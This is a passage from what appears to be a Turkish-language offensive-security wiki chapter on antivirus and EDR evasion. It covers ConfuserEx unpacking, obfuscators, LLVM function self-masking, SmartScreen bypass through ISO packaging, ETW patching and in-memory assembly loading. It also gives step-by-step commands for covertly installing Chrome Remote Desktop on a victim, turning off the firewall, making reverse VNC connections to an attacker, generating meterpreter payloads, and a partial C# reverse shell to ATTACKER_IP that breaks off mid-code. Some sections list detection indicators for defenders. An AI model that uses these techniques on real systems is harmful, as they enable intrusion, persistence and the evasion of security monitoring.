1.  Anti-tampering korumasını kaldırma – ConfuserEx her *method body*'yi şifreler ve şifreyi *module* static constructor'ı (`<Module>.cctor`) içinde çözer. Ayrıca PE checksum'ını yamalayarak herhangi bir değişikliğin binary'nin çökmesine neden olmasını sağlar. Şifrelenmiş metadata tablolarını bulmak, XOR anahtarlarını kurtarmak ve temiz bir assembly'yi yeniden yazmak için **AntiTamperKiller** kullanın:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Çıktı, kendi unpacker’ınızı oluştururken işe yarayabilecek 6 anti-tamper parametresini (`key0-key3`, `nameHash`, `internKey`) içerir.

2.  Sembol / control-flow kurtarma – *clean* dosyayı **de4dot-cex**'e (de4dot'un ConfuserEx-aware fork'u) verin.
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Flags:
     • `-p crx` – ConfuserEx 2 profilini seçer
     • de4dot, control-flow flattening işlemini geri alır, özgün namespace’leri, sınıfları ve değişken adlarını geri yükler ve sabit dizeleri çözer.

3.  Proxy-call stripping – ConfuserEx, decompilation’ı daha da zorlaştırmak için doğrudan method çağrılarını hafif wrapper’larla (diğer adıyla *proxy calls*) değiştirir. Bunları **ProxyCall-Remover** ile kaldırın:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Bu adımdan sonra, opak wrapper fonksiyonları (`Class8.smethod_10`, …) yerine `Convert.FromBase64String` veya `AES.Create()` gibi normal .NET API'lerini görmelisiniz.

4.  Manuel temizlik – ortaya çıkan binary'yi dnSpy altında çalıştırın ve gerçek payload'ı bulmak için büyük Base64 blob'larını veya `RijndaelManaged`/`TripleDESCryptoServiceProvider` kullanımını arayın. Malware çoğu zaman payload'ı `<Module>.byte_0` içinde başlatılan TLV kodlu bir byte dizisi olarak saklar.

Yukarıdaki zincir, kötü amaçlı örneği çalıştırmaya gerek kalmadan yürütme akışını geri yükler – çevrimdışı bir iş istasyonunda çalışırken kullanışlıdır.

> 🛈  ConfuserEx, örnekleri otomatik olarak triage etmek için IOC olarak kullanılabilecek `ConfusedByAttribute` adlı özel bir attribute üretir.

#### Tek satırlık komut
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Bu projenin amacı, [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) ve kurcalamaya karşı koruma yoluyla yazılım güvenliğini artırabilen, [LLVM](http://www.llvm.org/) derleme paketinin açık kaynaklı bir fork’unu sunmaktır.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator, harici bir araç kullanmadan ve derleyiciyi değiştirmeden, derleme zamanında obfuscated kod üretmek için `C++11/14` dilinin nasıl kullanılabileceğini gösterir.
- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming framework'ü tarafından üretilen obfuscated işlemlerden oluşan bir katman ekleyerek uygulamayı kırmaya çalışan kişinin işini biraz daha zorlaştırır.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz; .exe, .dll ve .sys dahil olmak üzere çeşitli PE dosyalarını obfuscate edebilen bir x64 binary obfuscator'dır.
- [**metame**](https://github.com/a0rtega/metame): Metame, rastgele executable dosyalar için basit bir metamorphic code engine'dir.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator, ROP (return-oriented programming) kullanan ve LLVM tarafından desteklenen diller için ince ayrıntılı bir code obfuscation framework'üdür. ROPfuscator, normal talimatları ROP chain'lerine dönüştürerek programı assembly code seviyesinde obfuscate eder ve böylece normal control flow'a ilişkin doğal algımızı bozar.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt/nimcrypt): Nimcrypt, Nim ile yazılmış bir .NET PE Crypter'dır.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor, mevcut EXE/DLL dosyalarını shellcode'a dönüştürüp yükleyebilir.

### LLVM compiler-assisted per-function self-masking

Bir implantın tamamını yalnızca uyku halindeyken maskelemek yerine, değiştirilmiş bir LLVM X86 backend'i seçili işlevleri etkin olmadıkları her zaman XOR-maskeli tutabilir. Function Peekaboo PoC'si, adı demangle edildikten sonra `REG_` içeren işlevleri seçer; son machine code'un çevresine position-independent giriş/çıkış stub'ları ekler ve `.text` içine paylaşılan tek bir masking handler yazar. Kaynak düzeyindeki imzalar ve Windows x64 calling convention değişmeden kalır.<sup>[[38]](#references)[[39]](#references)</sup>

#### Backend control-flow transformation

Bu işlem, instruction selection ve optimization sonrasında yapılmalıdır; çünkü dönüşüm **oluşturulan her return talimatını** kapsamalı ve x86 yerleşimini tam olarak bilmelidir. Emission öncesindeki bir `MachineFunctionPass`, son `MachineInstr::isReturn()` talimatını bulur, son yolun eklenen epilogue'a düşmesini sağlamak için bu talimatı siler ve önceki return talimatlarını `JMP_1 handler` ile değiştirir. Her return öncesindeki derleyici tarafından oluşturulan stack/frame temizleme talimatlarını koruyun; yalnızca return talimatının kendisini yönlendirin.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` ve `X86AsmPrinter::emitFunctionBodyEnd()` işleve özgü stub'ları, `emitEndOfAsmFile()` ise handler'ı üretir. Emission aşamaları arasında paylaşılan semboller, prologue'daki bir branch'in daha sonra oluşturulacak epilogue'u hedeflemesini sağlar. Elle oluşturulan bir near `je` için `0F 84` baytlarını ve ardından dört baytlık MC expression `target - address_after_je` ifadesini yazın. Handler'a yapılan çağrı ve atlamalar ise `MCInst` nesneleri (`CALL64pcrel32` ve `JMP_1`) olarak üretilebilir. Hiçbir şeyi değiştirmediği seçilmemiş bir işlev için pass `false` döndürmelidir; PoC bu durumda hatalı olarak `true` döndürür.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata ve pre-CRT initialization

PoC, `.funcmeta` içine bir XOR key'i ve loader tarafından yeniden konumlandırılan bir function pointer ile runtime uzunluğunu içeren 16 baytlık kayıtlar yerleştirir. C alanı `uint32_t` olsa da handler, kayıt içindeki `+8` konumundan başlayarak bir QWORD okur; böylece uzunluk ve padding'i tüketir ve kayıtlar arasında `0x10` bayt ilerler. PE section adları yalnızca sekiz bayt olduğundan, runtime lookup `.funcmet` adını görür. Harici bir patcher, executable `.stub` ekler, stub içine eski entry-point RVA değerini kaydeder ve `AddressOfEntryPoint` değerini değiştirir. PIC stub, image base'i `gs:[0x60]` → `[PEB+0x10]` üzerinden alır, önceden import edilmiş bir `VirtualProtect` işlevini çözümlemek için PE32+ import'larını tarar ve CRT'den önce çalışır.<sup>[[38]](#references)[[39]](#references)</sup>

Initialization, `gs:[0xE8]` içinde bir sentinel ayarlar ve metadata'daki her işlevi çağırır. Sürekli okunabilir olan prologue, işlev başlangıcını `gs:[0xF0]` içine kaydeder, sentinel'i algılar ve henüz maskelenmemiş body'yi atlar. Ardından epilogue `call handler` kullanır. Handler 13 register'ı (`0x68` bayt) kaydettikten sonra, `[rsp+0x68]` konumundaki return address dönüştürülmüş işlevin sonunu gösterir; bu nedenle `end - start` hesaplanıp metadata kaydına yazılabilir. Tüm body'ler maskelendikten sonra stub sentinel'i temizler ve `ImageBase + original_entry_point_RVA` adresine atlar.<sup>[[38]](#references)[[39]](#references)</sup>

Normal bir çağrıda prologue, body'nin şifresini çözmek için aynı simetrik handler'ı çağırır. Son yol eklenen epilogue'a düşerken, önceki her return doğrudan paylaşılan handler'a atlar. Normal epilogue da `call` yerine `jmp handler` kullanır; böylece yeniden maskeleme sonrasında handler'ın `ret` talimatı çağıranın özgün return address'ini tüketir ve işlev sonucunu `RAX` içinde korur.<sup>[[38]](#references)[[39]](#references)</sup>

#### Masking primitive ve analysis göstergeleri

Handler geçerli kaydı bulur, sabit ve görünür prologue'u (`bu derlemede 0x46` bayt) atlar, geri kalan kısmı `PAGE_EXECUTE_READWRITE` olarak ayarlar, düşük key baytıyla byte byte XOR uygular ve ardından `PAGE_EXECUTE_READ` olarak ayarlar. Böylece aynı döngü, girişte şifreyi çözer ve her normal çıkışta yeniden şifreler.<sup>[[38]](#references)[[39]](#references)</sup>

Bu tasarımın güçlü göstergeleri şunlardır:<sup>[[38]](#references)[[39]](#references)</sup>

- executable `.stub` içindeki bir entry point ve key ile yeniden konumlandırılmış `.text` pointer'larını içeren bir `.funcmet` section'ı;
- pre-CRT PEB, import table ve section table taramasının ardından metadata pointer'larının her biri üzerinden yapılan çağrılar;
- birbirinin aynısı `call`/`pop` PIC prologue'ları ve tek bir handler'a yönlendirilen çok sayıda return noktası;
- `gs:[0xE8]`, `gs:[0xF0]` ve `gs:[0xF8]` adreslerine yapılan yazmaların ardından tekrarlanan `VirtualProtect` geçişleri ve image-backed executable page'lere yapılan byte byte XOR yazmaları.

Bu, cryptographic protection değil, memory-scanner evasion tekniğidir: patch uygulanmış dosya özgün, açık body'yi hâlâ içerir ve debugger ile `VirtualProtect` veya XOR döngüsünde durdurma yapılarak etkin işlev dump edilebilir. Tek baytlık XOR, okunabilir metadata ve sabit `0x46` sınırı da çevrimdışı kurtarmayı kolaylaştırır.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> PoC'nin TEB slot'ları thread-local olsa da değiştirilmiş code page'leri process-wide'dir. Bu nedenle eşzamanlı veya recursive giriş, başka bir çağrı çalışırken talimatların yeniden toggle edilmesine yol açabilir; exception'lar ve nonlocal exit'ler de yeniden maskeleme işlemini atlayabilir. Sağlam bir uygulama geçişleri senkronize etmeli, `lpflOldProtect` üzerinden döndürülen gerçek koruma değerini geri yüklemeli, sabit kodlanmış stub uzunluklarından kaçınmalı, x64 stack alignment için hem `call` hem `jmp` yollarını denetlemeli ve executable baytları yeniden yazdıktan sonra `FlushInstructionCache` çağırmalıdır. Microsoft, executable kod değiştirildiğinde instruction-cache tutarlılığının sağlanmasını açıkça çağıranın sorumluluğuna bırakır.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

İnternetten bazı executable dosyaları indirip çalıştırdığınızda bu ekranı görmüş olabilirsiniz.

Microsoft Defender SmartScreen, son kullanıcıyı potansiyel olarak kötü amaçlı uygulamaları çalıştırmaya karşı korumak için tasarlanmış bir güvenlik mekanizmasıdır.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen çoğunlukla reputation-based bir yaklaşımla çalışır. Bu, nadiren indirilen uygulamaların SmartScreen'i tetikleyeceği ve böylece son kullanıcıyı uyarıp dosyayı çalıştırmasını engelleyeceği anlamına gelir (ancak Daha Fazla Bilgi -> Yine de çalıştır'a tıklayarak dosya yine de çalıştırılabilir).

**MoTW** (Mark of The Web), Zone.Identifier adlı bir [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)'dir. İnternetten indirilen dosyalar oluşturulurken otomatik olarak eklenir ve dosyanın indirildiği URL'yi de içerir.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>İnternetten indirilen bir dosyanın Zone.Identifier ADS bilgisini kontrol etme.</p></figcaption></figure>

> [!TIP]
> **Güvenilir** bir signing certificate ile imzalanmış executable dosyaların **SmartScreen'i tetiklemeyeceğini** unutmayın.

Payload'larınızın Mark of The Web almasını önlemenin çok etkili bir yolu, onları ISO gibi bir container içine paketlemektir. Bunun nedeni, Mark-of-the-Web'in (MOTW) **NTFS olmayan** volume'lere uygulanamamasıdır.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/), Mark-of-the-Web'den kaçınmak için payload'ları output container'larına paketleyen bir araçtır.

Örnek kullanım:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW), Windows'ta uygulamaların ve sistem bileşenlerinin **olayları günlüğe kaydetmesini** sağlayan güçlü bir günlükleme mekanizmasıdır. Ancak güvenlik ürünleri tarafından kötü amaçlı etkinlikleri izlemek ve tespit etmek için de kullanılabilir.

AMSI'nin devre dışı bırakılmasına (bypass edilmesine) benzer şekilde, kullanıcı alanı sürecindeki **`EtwEventWrite`** işlevinin hiçbir olayı günlüğe kaydetmeden hemen dönmesini sağlamak da mümkündür. Bunun için işlev bellekte yamalanarak hemen dönmesi sağlanır ve böylece ilgili süreç için ETW günlüklemesi etkili bir şekilde devre dışı bırakılır.

Daha fazla bilgiyi **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) ve [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** adreslerinde bulabilirsiniz.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

C# binary dosyalarını belleğe yükleme yöntemi uzun zamandır biliniyor ve post-exploitation araçlarınızı AV'ye yakalanmadan çalıştırmanın hâlâ çok iyi bir yolu.

payload doğrudan belleğe yükleneceği ve diske yazılmayacağı için yalnızca tüm süreç için AMSI'yi yamalamamız gerekecek.

Çoğu C2 framework'ü (sliver, Covenant, metasploit, CobaltStrike, Havoc vb.) C# assembly'lerini doğrudan bellekte çalıştırma olanağı sunuyor; ancak bunu yapmanın farklı yolları var:

- **Fork\&Run**

Bu yöntemde **yeni bir sacrificial process başlatılır**, post-exploitation amaçlı kötü amaçlı kodunuz bu yeni sürece inject edilir, kod çalıştırılır ve işlem tamamlandığında yeni süreç sonlandırılır. Bu yöntemin hem avantajları hem de dezavantajları vardır. Fork and run yönteminin avantajı, yürütmenin Beacon implant sürecimizin **dışında** gerçekleşmesidir. Bu, post-exploitation işleminizde bir şey ters giderse veya yakalanırsa **implantınızın hayatta kalma ihtimalinin çok daha yüksek** olduğu anlamına gelir. Dezavantajı ise **Behavioural Detections** tarafından yakalanma ihtimalinizin **daha yüksek** olmasıdır.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Bu yöntemde post-exploitation amaçlı kötü amaçlı kod **kendi sürecine** inject edilir. Böylece yeni bir süreç oluşturup AV'ye taratmak zorunda kalmazsınız. Ancak payload'unuz yürütülürken bir şeyler ters giderse çökebileceğinden **beacon'ınızı kaybetme ihtimaliniz çok daha yüksektir**.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assembly yükleme hakkında daha fazla bilgi edinmek için şu makaleye göz atın: [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) Ayrıca InlineExecute-Assembly BOF'a da bakabilirsiniz ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

C# Assembly'lerini **PowerShell'den** de yükleyebilirsiniz; [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) ve [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk) kaynaklarına göz atın.

## .NET araçlarının NativeAOT WebAssembly ile yeniden paketlenmesi (WasmForge)

Normal `execute-assembly` teknikleri tanınabilir MSIL'i korur ve sonunda bir CLR başlatır. **WasmForge** bunun yerine yürütme altyapısını değiştirir: bir C# projesini deneysel NativeAOT-LLVM WASI hedefine taşır, önceden WebAssembly'ye derler ve bu modülü Wazero tabanlı bir Windows PE host'una gömer. Ortaya çıkan süreç hedefin CLR, JIT veya `dotnet` host'una ihtiyaç duymaz; bu nedenle yalnızca managed assembly adlarına, CLR yüklemesine, AMSI'ye veya .NET ETW'ye dayalı kurallar doğrudan görünürlüklerini kaybeder. Bu, bir kaçınma/paketleme tekniğidir; ayrıcalık sınırını aşma yöntemi değildir: guest, özgün aracın izinlerini ve gözlemlenebilir OS davranışını korur.<sup>[[44]](#references)[[45]](#references)</sup>

### C# projesi derleme

Önerilen derleme yolu, .NET 10 SDK'sını, NativeAOT-LLVM workload'unu, WASI SDK 24.0'ı, linker'ı ve signing bağımlılıklarını içerdiği için projenin Docker ortamını kullanmaktır. Bir `.csproj` otomatik olarak algılanır; tek seferlik derleme migration, uyumluluk yamalama, WASM derleme, PE oluşturma ve signing işlemlerini gerçekleştirir.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Sorun giderme veya oluşturulan kodu inceleme için süreci `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` ve son olarak `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>` adımlarına bölün. Derleme imajı ayrıca WASI Preview 2 component encoding'ini önleyip gömülü runtime'ın beklediği düz modülü üretmek için bir `wasm-component-ld` wrapper'ı kullanır.<sup>[[44]](#references)[[45]](#references)</sup>

### wasm32 C#'ı x64 Win32'ye köprüleme

Bu, şeffaf bir yeniden derleme değildir. NativeAOT-WASI, Windows odaklı BCL özelliklerinden yoksundur veya bu özellikleri değiştirir; ayrıca wasm32 guest genellikle dört baytlık pointer slot'ları ayırırken x64 API'leri sekiz baytlık pointer'lar döndürebilir. WasmForge, aşağıdaki oluşturulan katmanlarla bu iki sorunu da ele alır:<sup>[[44]](#references)</sup>

1. Bir kaynak patcher, AOT'ye özgü anlamsal farklılıkları düzeltir ve desteklenmeyen registry, pipes, WMI, identity, directory-service, file-version, LSA ve benzeri çağrıları `Wf*` yardımcılarına yönlendirir.
2. Bir P/Invoke tarayıcısı, `[DllImport]` çağrılarının guest içinde belirtilen DLL'yi dinamik olarak yüklemek yerine bağlantılı C köprü sembollerine bağlanması için NativeAOT `DirectPInvoke` eşlemeleri üretir.
3. Host'a bağlı pointer'lar C#'ta `ulong`, C'de `uint64_t` kullanır. Genel bir dispatcher, çağrıyı host'un Win32 handler'ına iletir; `out8_mask`, üst yarılarının korunması gereken gerçek sekiz baytlık çıktı slot'larını işaretler. İşaretlenmemiş, wasm32 biçimindeki çıktılar ise x64 yazma işleminin bitişik dört baytı bozmasını önlemek için snapshot/restore koruması kullanır.
4. Ayrılmış host köprüleri; LSA ticket-cache erişimi, yapılandırılmış sonuçlara sahip Kerberos/BCrypt işlemleri, TCP KDC trafiği ve LDAP sorguları gibi genel syscall dispatch'e uymayan işlemleri yönetir.

Örneğin `version.dll!VerQueryValueW` için bir wrapper, dört host adresi iletir ve değer pointer'ı ile uzunluk sekiz baytlık çıktı slot'ları olduğundan 2. ve 3. bitleri (`0xC`) ayarlar. Wrapper'ın kendisi genel kalır ve DLL adını, export adını, argümanları ve maskeyi `wf_call_v2`'ye iletir; host pointer çevirisini yapar ve native API'yi çağırır.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Kısıtlamalar ve tespit pivotları

Yansıma yoğun kod, dinamik assembly yükleme, rastgele native callback'ler ve WASM belleğine döndürülen karmaşık x64 yapıları yine de araca özel yamalar gerektirebilir veya tamamen başarısız olabilir. Genel WASI Preview 2 soketleri no-op stub'lara da ulaşabilir; bu nedenle desteklenen araçlar protokole özel host shim'leri kullanır. Özelliklerin eşdeğer olduğunu varsaymak yerine her komutu native bir build ile doğrulayın.<sup>[[44]](#references)[[45]](#references)</sup>

Bu teknik, payload'u görünmez kılmak yerine telemetriyi başka yere kaydırır. Tespit; WASM modülü içeren veya bellekte oluşturan bir PE'ye, Wazero benzeri runtime davranışına, olağandışı host/guest bellek ayırma ve kopyalama işlemlerine, genel doğrudan Win32 dispatch'e, imza ve PE resource anomalilerine, ayrıca ortaya çıkan API çağrılarına ve ağ trafiğine yönelebilir. Bu nedenle CLR yükleme, AMSI veya .NET ETW olaylarının bulunmaması, bir sürecin zararsız olduğunun kanıtı olarak değerlendirilmemelidir.<sup>[[44]](#references)</sup>

## Diğer Programlama Dillerini Kullanma

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) içinde önerildiği gibi, güvenliği ihlal edilmiş makinenin **Attacker Controlled SMB share üzerinde kurulu interpreter ortamına erişmesini sağlayarak** diğer dillerle kötü amaçlı kod çalıştırmak mümkündür.

SMB share üzerindeki Interpreter Binaries'e ve ortama erişim sağlayarak, güvenliği ihlal edilmiş makinenin belleğinde bu dillerde **rastgele kod çalıştırabilirsiniz**.

Repo'da belirtildiği üzere: Defender script'leri taramaya devam eder, ancak Go, Java, PHP vb. kullanarak **statik imzaları atlatmak için daha fazla esnekliğe** sahip oluruz. Bu dillerde rastgele, obfuscation uygulanmamış reverse shell script'leriyle yapılan testler başarılı olmuştur.

## WebAssembly re-hosting for static-analysis evasion

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping, EDR veya AV gibi bir güvenlik ürününün access token'ını manipüle eder. Token'ın ayrıcalıklarını azaltmak, sürecin çalışmaya devam etmesini sağlarken ayrıcalıklı inceleme veya düzeltme işlemlerini gerçekleştirmesini engelleyebilir.

Bunu önlemek için Windows, **harici süreçlerin** güvenlik süreçlerinin token'ları üzerinde handle almasını engelleyebilir.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Güvenilir Yazılımları Kullanma

### Chrome Remote Desktop

[**Bu blog yazısında**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) açıklandığı gibi, kurbanın PC'sine Chrome Remote Desktop'ı dağıtıp ardından erişimi ele geçirmek ve kalıcılığı sürdürmek için kullanmak kolaydır:<sup>[[35]](#references)</sup>
1. https://remotedesktop.google.com/ adresinden indirin, "Set up via SSH" seçeneğine tıklayın ve ardından MSI dosyasını indirmek için Windows MSI dosyasına tıklayın.
2. Kurulum programını kurbanda sessizce çalıştırın (admin gerekir): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop sayfasına geri dönüp next'e tıklayın. Sihirbaz sizden yetkilendirme isteyecektir; devam etmek için Authorize düğmesine tıklayın.
4. Sağlanan komutu gerekli değişikliklerle çalıştırın: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (`--pin` parametresi, GUI'yi kullanmadan PIN'i ayarlar).
 

## Gelişmiş Evasion

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Evasion çok karmaşık bir konudur. Bazen tek bir sistemdeki çok sayıda farklı telemetri kaynağını hesaba katmanız gerekir; bu nedenle olgun ortamlarda tamamen tespit edilmeden kalmak neredeyse imkânsızdır.

Karşılaşacağınız her ortamın kendine özgü güçlü ve zayıf yönleri vardır.

Daha gelişmiş Evasion teknikleri hakkında temel bilgi edinmek için [@ATTL4S](https://twitter.com/DaniLJ94) tarafından yapılan bu konuşmayı izlemenizi önemle tavsiye ederim.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Bu da [@mariuszbit](https://twitter.com/mariuszbit) tarafından Evasion in Depth hakkında yapılan bir başka harika konuşma.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Eski Teknikler**

### **Defender'ın hangi bölümleri kötü amaçlı bulduğunu kontrol etme**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) kullanarak, **Defender'ın hangi bölümü kötü amaçlı bulduğunu belirleyene kadar binary'nin bölümlerini kaldırabilir** ve tespit edilen bölümü size ayırmasını sağlayabilirsiniz.\
**Aynı işi yapan** bir diğer araç [**avred**](https://github.com/dobin/avred); hizmeti [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) adresinde açık bir web arayüzüyle sunuyor.

### **Telnet Server**

Windows10'a kadar tüm Windows sürümleri, yönetici olarak yükleyebileceğiniz bir **Telnet server** ile birlikte geliyordu. Bunun için şunu çalıştırın:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Sistem başlatıldığında **başlamasını** ve şimdi **çalıştırılmasını** sağlayın:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Telnet portunu değiştir (gizlilik) ve güvenlik duvarını devre dışı bırak**:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Buradan indirin: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (setup dosyasını değil, bin dosyalarını indirin)

**HOST'TA**: _**winvnc.exe**_ dosyasını çalıştırın ve sunucuyu yapılandırın:

- _Disable TrayIcon_ seçeneğini etkinleştirin
- _VNC Password_ alanına bir parola belirleyin
- _View-Only Password_ alanına bir parola belirleyin

Ardından _**winvnc.exe**_ binary dosyasını ve **yeni** oluşturulan _**UltraVNC.ini**_ dosyasını **kurbanın** sistemine taşıyın.

#### **Ters bağlantı**

**Saldırgan**, ters **VNC bağlantısını** yakalamaya hazır olması için kendi **host**'unda `vncviewer.exe -listen 5900` binary dosyasını **çalıştırmalıdır**. Ardından **kurbanın** sisteminde: `winvnc.exe -run` komutuyla winvnc daemon'ını başlatın ve `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` komutunu çalıştırın.

**UYARI:** Gizliliği korumak için bazı şeyleri yapmamalısınız:

- `winvnc` zaten çalışıyorsa başlatmayın; aksi takdirde bir [popup](https://i.imgur.com/1SROTTl.png) tetiklenir. Çalışıp çalışmadığını `tasklist | findstr winvnc` komutuyla kontrol edin.
- `winvnc`'i aynı dizinde `UltraVNC.ini` dosyası olmadan başlatmayın; aksi takdirde [yapılandırma penceresi](https://i.imgur.com/rfMQWcf.png) açılır.
- Yardım için `winvnc -h` komutunu çalıştırmayın; aksi takdirde bir [popup](https://i.imgur.com/oc18wcu.png) tetiklenir.

### GreatSCT

Buradan indirin: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

GreatSCT içinde:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Şimdi `msfconsole -r file.rc` ile **listener'ı başlatın** ve **xml payload'ını** şu komutla **çalıştırın**:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Mevcut Defender işlemi çok hızlı sonlandırır.**

### Kendi reverse shell'imizi derleme

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### İlk C# Revershell

Şununla derleyin:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Şununla kullan:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
